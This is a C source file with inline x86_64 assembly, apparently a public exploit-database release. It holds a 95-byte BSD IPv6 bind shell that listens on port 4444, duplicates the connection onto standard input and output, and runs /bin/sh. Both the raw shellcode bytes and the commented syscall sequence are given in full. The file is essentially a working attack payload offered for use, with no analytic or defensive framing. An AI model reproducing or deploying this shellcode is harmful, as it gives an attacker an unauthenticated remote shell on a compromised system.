/*
BSD x86_64 ipv6 bind_tcp shellcode, 95 bytes
Balazs Bucsay
@xoreipeip | earthquake <at@> rycon <do.t> hu  
http://rycon.hu

port = 4444
ip = ::1

char shellcode[] = \
"\x6a\x61\x58\x99\x6a\x1c\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52\x52\x52\x48"
"\xba\x00\x1c\x11\x5c\x00\x00\x00\x00\x52\x48\x89\xe6\x6a\x1c\x5a\x04\x4c"
"\x0f\x05\x48\x31\xf6\x6a\x6a\x58\x0f\x05\x99\x04\x1e\x0f\x05\x48\x89\xc7"
"\x6a\x5a\x58\x0f\x05\xff\xc6\x04\x5a\x0f\x05\xff\xc6\x04\x59\x0f\x05\x52"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x52\x57\x48\x89"
"\xe6\x04\x39\x0f\x05";
*/

int main() 
{
	asm(
	// socket(28,1,0);
	"	push $97		\n"
	"	pop %rax		\n"
	"	cltd			\n"
	"	push $0x1c		\n"
	"	pop %rdi		\n"
	"	push $0x01		\n"
	"	pop %rsi		\n"
	"	syscall	   		\n"
	
	// bind(s, struct, 28)
	"	xchg %rax, %rdi		\n"
	"	push %rdx		\n"
	"	push %rdx		\n"
	"	push %rdx		\n"
	"	mov $0x000000005c111c00, %rdx\n"
	"	push %rdx		\n"
	"	mov %rsp, %rsi  	\n"
	"	push $28	  	\n"
	"	pop %rdx		\n"
	" 	add $76, %al		\n"
	"	syscall	   		\n"

	//listen(s, 0)
	"	xor %rsi, %rsi		\n"
	"	push $106		\n"
	"	pop %rax		\n"
	"	syscall	   		\n"

	// accept(s, 0, 0)
	"	cltd			\n"
	"	add $30, %al		\n"
	"	syscall	   		\n"

	// dup2(c, 0);
	"	mov %rax, %rdi		\n"
	"	push $90		\n"
	"	pop %rax		\n"
	"	syscall	   		\n"

	// dup2(c, 1);
	"	inc %esi		\n"
	"	add $90, %al		\n"
	"	syscall	   		\n"

	// dup2(c, 2);
	"	inc %esi		\n"
	"	add $89, %al		\n"
	"	syscall	   		\n"

	// execve("/bin/sh", {"/bin/sh", 0}, 0)
	" 	push %rdx		\n"
	"	mov $0x68732f6e69622f2f, %rdi\n"
	"	push %rdi		\n"
	"	mov %rsp, %rdi		\n"
	"	push %rdx		\n"
	"	push %rdi		\n"
	"	mov %rsp, %rsi		\n"
	"	add $57, %al		\n"
	"	syscall	   		\n"
	);
}
